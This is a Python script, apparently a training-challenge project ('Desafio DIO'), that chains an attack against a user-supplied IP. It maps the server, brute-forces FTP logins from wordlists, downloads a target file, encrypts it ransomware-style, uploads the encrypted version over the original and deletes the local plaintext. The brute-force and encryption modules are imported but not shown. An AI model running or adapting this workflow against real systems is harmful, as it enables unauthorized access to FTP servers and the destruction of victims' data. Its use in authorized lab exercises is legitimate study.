import os
import sys

caminha_atual = os.path.dirname(os.path.abspath(__file__))
caminho_modulo = os.path.join(caminha_atual, os.pardir)
sys.path.append(caminho_modulo)

from Acess.ftp import acess_ftp, upload_and_delete
from Attacking.brute_force import b_f
from Attacking.ransoware import genarate_key, encrypt_file, decrypt_file
from Functions.mapping import responseServer
from Functions.mapping import mappingServer

print("Desafio DIO")

def main():
    ip = input("Informe o ip: ")
    responseServer(ip)
    mappingServer(ip)
    diret_user = input("Informe a wordlist para usuários: ")
    #processar_diretorio(diret_user.strip())

    diret_pass = input("Informe a wordlist para senhas: ")
    # processar_diretorio(diret_pass.strip())
    user, passw = b_f(ip, diret_user, diret_pass)
    #download_ftp_file_ftplib()
    
    if user and passw:
        print("Begin the acess FTP")
        target_file_local, target_file_remote = acess_ftp(ip, user, passw)

        if target_file_local and target_file_remote:
            attack_key = genarate_key()
            print(f"Key generated: {attack_key.decode()}")  
            
            encrypt_file(target_file_local, attack_key)
            local_encrypted_file = target_file_local + ".encrypted"
            upload_and_delete(ip, user, passw, local_encrypted_file, target_file_remote)

            try:
                os.remove(target_file_local)
                print(f"Original local file {target_file_local} removed")
            except OSError as oE:
                print(f"Error removing the original local file {oE}.")
        else:
            print("Download of the target file failed. Aborting encryption attack.")
    else:
        print("No credetials")



        
if __name__ == "__main__":
    main()